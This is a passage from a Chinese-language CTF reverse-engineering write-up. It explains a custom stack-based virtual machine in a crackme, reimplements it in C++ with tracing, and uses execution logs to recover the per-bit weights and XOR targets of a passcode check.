     v19 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v19-&gt;next = v2;</span><br><span class="line">        v2 = v19;</span><br><span class="line">        v19-&gt;val = v15 * v16;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v22 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v20 = *v22;</span><br><span class="line">          <span class="built_in">free</span>(v22);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v23 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v21 = *v23;</span><br><span class="line">            <span class="built_in">free</span>(v23);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v21 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v20 = <span class="number">0x80000000</span>;</span><br><span class="line">          v21 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v24 = v21 + v20;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_52;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        sub_1400011B0(<span class="string">&quot;%c&quot;</span>, v5);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        v25 = *input;</span><br><span class="line">        v26 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v26-&gt;next = v2;</span><br><span class="line">        v2 = v26;</span><br><span class="line">        v26-&gt;val = v25;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v29 = &amp;v2-&gt;val;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v27 = *v29;</span><br><span class="line">          <span class="built_in">free</span>(v29);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v30 = &amp;v2-&gt;val;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v28 = *v30;</span><br><span class="line">            <span class="built_in">free</span>(v30);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v28 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LOBYTE(v27) = <span class="number">0</span>;</span><br><span class="line">          v28 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v31 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v31-&gt;next = v2;</span><br><span class="line">        v2 = v31;</span><br><span class="line">        v31-&gt;val = (v28 &gt;&gt; v27) &amp; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v34 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v32 = *v34;</span><br><span class="line">          <span class="built_in">free</span>(v34);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v35 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v33 = *v35;</span><br><span class="line">            <span class="built_in">free</span>(v35);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v33 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v32 = <span class="number">0x80000000</span>;</span><br><span class="line">          v33 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v36 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v36-&gt;next = v2;</span><br><span class="line">        v2 = v36;</span><br><span class="line">        v36-&gt;val = v32 ^ v33;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        ++input;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xA</span>u:</span><br><span class="line">        <span class="keyword">return</span> v5;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v39 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v37 = *v39;</span><br><span class="line">          <span class="built_in">free</span>(v39);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v40 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v38 = *v40;</span><br><span class="line">            <span class="built_in">free</span>(v40);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v38 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v37 = <span class="number">0x80000000</span>;</span><br><span class="line">          v38 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v41 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v41-&gt;next = v2;</span><br><span class="line">        v2 = v41;</span><br><span class="line">        v41-&gt;val = v37 - v38;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v44 = &amp;v2-&gt;val;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v42 = *v44;</span><br><span class="line">          <span class="built_in">free</span>(v44);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v45 = &amp;v2-&gt;val;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v43 = *v45;</span><br><span class="line">            <span class="built_in">free</span>(v45);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v43 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v42 = <span class="number">0x80000000</span>;</span><br><span class="line">          v43 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v24 = v42 / v43;</span><br><span class="line">LABEL_52:</span><br><span class="line">        v11-&gt;val = v24;</span><br><span class="line">LABEL_53:</span><br><span class="line">        v11-&gt;next = v2;</span><br><span class="line">        v2 = v11;</span><br><span class="line">LABEL_54:</span><br><span class="line">        v46 = *PC++;</span><br><span class="line">        opcode = v46 - <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span> ( opcode &lt;= <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_57:</span><br><span class="line">        sub_1400011B0(<span class="string">&quot;WTF are u doinggg...&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恢复结构体之后这个 vm 还是很一目了然的，下面解释一下各个 opcode 的作用。</p><ul><li>0：取模操作（先弹出的值在运算符左侧）</li><li>1：push 操作</li><li>2：pop 操作</li><li>3：乘法操作</li><li>4：加法操作</li><li>5：输出</li><li>6：取输入指针</li><li>7：右移位后取最低位（先弹出的值在运算符右侧）</li><li>8：异或操作</li><li>9：输入指针+1</li><li>10：返回</li><li>11：减法操作（先弹出的值在运算符左侧）</li><li>12：除法操作（先弹出的值在运算符左侧）</li></ul><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>同时可以根据操作自己实现虚拟机，这里已经很清楚是栈的数据结构了就直接用 <code>std::stack</code> 实现即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt;s;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">0x10000</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getstackval</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> val=<span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">if</span>(s.<span class="built_in">size</span>())&#123;</span><br><span class="line">val=s.<span class="built_in">top</span>();</span><br><span class="line">s.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushstackval</span><span class="params">(<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;push val %d\n&quot;</span>,val);</span><br><span class="line">s.<span class="built_in">push</span>(val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd=<span class="built_in">open</span>(<span class="string">&quot;./quest&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">size_t</span> ret=<span class="built_in">read</span>(fd,buffer,<span class="number">0x10000</span>);</span><br><span class="line"><span class="type">char</span> *PC=buffer;</span><br><span class="line"><span class="type">int</span> reg1,reg2,reg3;</span><br><span class="line"><span class="type">char</span> input[]=<span class="string">&quot;flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaa&#125;&quot;</span>;</span><br><span class="line"><span class="type">char</span> *p=input;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">char</span> opcode=*PC<span class="number">-0x10</span>;</span><br><span class="line"><span class="type">char</span> operand;</span><br><span class="line">PC++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2%reg3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d %% %d=%d&quot;</span>,reg2,reg3,reg2%reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">operand=*PC++;</span><br><span class="line"><span class="built_in">pushstackval</span>(operand);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">reg1=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pop %d to reg1\n&quot;</span>,reg1);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d*%d=%d\n&quot;</span>,reg2,reg3,reg2*reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2*reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d+%d=%d\n&quot;</span>,reg2,reg3,reg2+reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2+reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;output a char %c\n&quot;</span>,reg1);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;get %d input\n&quot;</span>,p-input<span class="number">+1</span>,*p);</span><br><span class="line"><span class="built_in">pushstackval</span>(*p);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc (%d&gt;&gt;%d)&amp;1=%d\n&quot;</span>,reg2,reg3,(reg2&gt;&gt;reg3)&amp;<span class="number">1</span>);</span><br><span class="line"><span class="built_in">pushstackval</span>((reg2&gt;&gt;reg3)&amp;<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d^%d=%d\n&quot;</span>,reg2,reg3,reg2^reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2^reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">p++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;retval=%d\n&quot;</span>,reg1);</span><br><span class="line"><span class="keyword">return</span> reg1;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d-%d=%d\n&quot;</span>,reg2,reg3,reg2-reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2-reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d/%d=%f\n&quot;</span>,reg2,reg3,reg2/reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2/reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;invalid op&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面节选一段log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 0</span><br><span class="line">calc (102&gt;&gt;0)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 2</span><br><span class="line">calc 2*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 1</span><br><span class="line">calc (102&gt;&gt;1)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 3</span><br><span class="line">calc 3*1=3</span><br><span class="line">push val 3</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 2</span><br><span class="line">calc (102&gt;&gt;2)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 67</span><br><span class="line">calc 67*1=67</span><br><span class="line">push val 67</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 3</span><br><span class="line">calc (102&gt;&gt;3)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 37</span><br><span class="line">calc 37*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 4</span><br><span class="line">calc (102&gt;&gt;4)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 41</span><br><span class="line">calc 41*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 5</span><br><span class="line">calc (102&gt;&gt;5)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 11</span><br><span class="line">calc 11*1=11</span><br><span class="line">push val 11</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 6</span><br><span class="line">calc (102&gt;&gt;6)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 13</span><br><span class="line">calc 13*1=13</span><br><span class="line">push val 13</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 7</span><br><span class="line">calc (102&gt;&gt;7)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 89</span><br><span class="line">calc 89*0=0</span><br><span class="line">push val 0</span><br><span class="line">calc 0+13=13</span><br><span class="line">push val 13</span><br><span class="line">calc 13+11=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+67=91</span><br><span class="line">push val 91</span><br><span class="line">calc 91+3=94</span><br><span class="line">push val 94</span><br><span class="line">calc 94+0=94</span><br><span class="line">push val 94</span><br><span class="line">push val 70</span><br><span class="line">calc 70^94=24</span><br><span class="line">push val 24</span><br><span class="line">get 2 input</span><br><span class="line">push val 108</span><br><span class="line">push val 0</span><br><span class="line">calc (108&gt;&gt;0)&amp;1=0</span><br></pre></td></tr></table></figure><p>最前面事实上就是输出一句话 <code>Thank for providing passcode, my ultimate secret box is checking...</code> 用的，跳过之后就能看到。其中最明显的应该能看到它频繁的取输入字符并做 <code>(x&gt;&gt;y)&amp;1</code> 的运算，y 从 <code>0~7</code>，不难想到，这是在一个一个取出输入字节的每一位，每一位都对应了一个权值。第一个字节可以看出来，从低位到高位权值分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 67 37 41 11 13 89</span><br></pre></td></tr></table></figure><p>而最后，它将所有权值相加，得到的结果和 70 做异或运算得到 24，将该值存入栈底。</p><p>而把log拉到最后发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">calc 137+71=208</span><br><span class="line">push val 208</span><br><span class="line">calc 208+39=247</span><br><span class="line">push val 247</span><br><span class="line">calc 247+120=367</span><br><span class="line">push val 367</span><br><span class="line">calc 367+22=389</span><br><span class="line">push val 389</span><br><span class="line">calc 389+119=508</span><br><span class="line">push val 508</span><br><span class="line">calc 508+89=597</span><br><span class="line">push val 597</span><br><span class="line">calc 597+22=619</span><br><span class="line">push val 619</span><br><span class="line">calc 619+218=837</span><br><span class="line">push val 837</span><br><span class="line">calc 837+203=1040</span><br><span class="line">push val 1040</span><br><span class="line">calc 1040+125=1165</span><br><span class="line">push val 1165</span><br><span class="line">calc 1165+125=1290</span><br><span class="line">push val 1290</span><br><span class="line">calc 1290+5=1295</span><br><span class="line">push val 1295</span><br><span class="line">calc 1295+118=1413</span><br><span class="line">push val 1413</span><br><span class="line">calc 1413+30=1443</span><br><span class="line">push val 1443</span><br><span class="line">calc 1443+59=1502</span><br><span class="line">push val 1502</span><br><span class="line">calc 1502+89=1591</span><br><span class="line">push val 1591</span><br><span class="line">calc 1591+213=1804</span><br><span class="line">push val 1804</span><br><span class="line">calc 1804+114=1918</span><br><span class="line">push val 1918</span><br><span class="line">calc 1918+35=1953</span><br><span class="line">push val 1953</span><br><span class="line">calc 1953+18=1971</span><br><span class="line">push val 1971</span><br><span class="line">calc 1971+18=1989</span><br><span class="line">push val 1989</span><br><span class="line">calc 1989+121=2110</span><br><span class="line">push val 2110</span><br><span class="line">calc 2110+65=2175</span><br><span class="line">push val 2175</span><br><span class="line">calc 2175+32=2207</span><br><span class="line">push val 2207</span><br><span class="line">calc 2207+221=2428</span><br><span class="line">push val 2428</span><br><span class="line">calc 2428+253=2681</span><br><span class="line">push val 2681</span><br><span class="line">calc 2681+348=3029</span><br><span class="line">push val 3029</span><br><span class="line">calc 3029+130=3159</span><br><span class="line">push val 3159</span><br><span class="line">calc 3159+92=3251</span><br><span class="line">push val 3251</span><br><span class="line">calc 3251+140=3391</span><br><span class="line">push val 3391</span><br><span class="line">calc 3391+24=3415</span><br><span class="line">push val 3415</span><br><span class="line">pop 3415 to reg1</span><br><span class="line">retval=3415</span><br></pre></td></tr></table></figure><p>我们所计算的第一个异或值，在最后一刻被加起来返回了。</p><p>而外面判断我们的输入是否正确，依赖于返回值是否为 0，因此我们要尽可能让每次异或值都相等，这里用个小技巧，将要输出的值打印到 stderr 中，再用重定向 <code>2&gt;out.txt</code> 就可以快速拿到一些值。</p><p>首先我们拿异或的目标值，在异或的 opcode 中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code>，得到值。</p><p>然后拿每一个字节的每一位的权值，在 <code>*</code> 运算中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code>，得到值。</p><p>最终根据逻辑，写出还原 passcode 的逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 